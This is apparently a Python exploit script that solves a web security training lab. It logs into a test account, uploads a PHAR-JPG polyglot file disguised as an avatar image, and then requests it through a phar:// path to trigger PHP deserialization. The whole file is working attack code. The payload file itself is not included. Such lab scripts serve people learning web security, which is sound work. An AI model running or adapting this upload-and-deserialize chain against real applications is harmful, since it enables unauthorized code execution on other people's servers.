import requests
import sys
import urllib3, urllib.parse
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, csrf_path, username, password):
    login_url = url + path
    payload = {
        "username": username,
        "password": password,
        "csrf": get_csrf_token(s, url, csrf_path)
    }
    r = s.post(login_url, data=payload, headers=headers, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def upload_vuln_file(s, url, path, filename, filepath):
    target_url = url + path
    with open(filepath, 'rb') as f:
        file_data = f.read()
    multipart_form_data = [
        ('avatar', (filename, file_data, 'image/jpeg')),
        ('csrf', (None, get_csrf_token(s, url, '/my-account'))),
    ]
    r = s.post(target_url, files=multipart_form_data, allow_redirects=False)
    if r.status_code == 302:
        print('[+] Successful uploaded vuln file')
    else:
        print('[-] Fail to upload vuln file')
        sys.exit(-1)

def goto(s, url, path):
    target_url = url + path
    r = s.get(target_url)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)
        
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    username = 'wiener'
    password = 'peter'

    login_acc(s, url, '/login', '/my-account', username, password)
    upload_vuln_file(s, url, '/my-account/avatar', 'out.jpg', './phar-jpg-polyglot/out.jpg')
    goto(s, url, f'/cgi-bin/avatar.php?avatar=phar://{username}')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()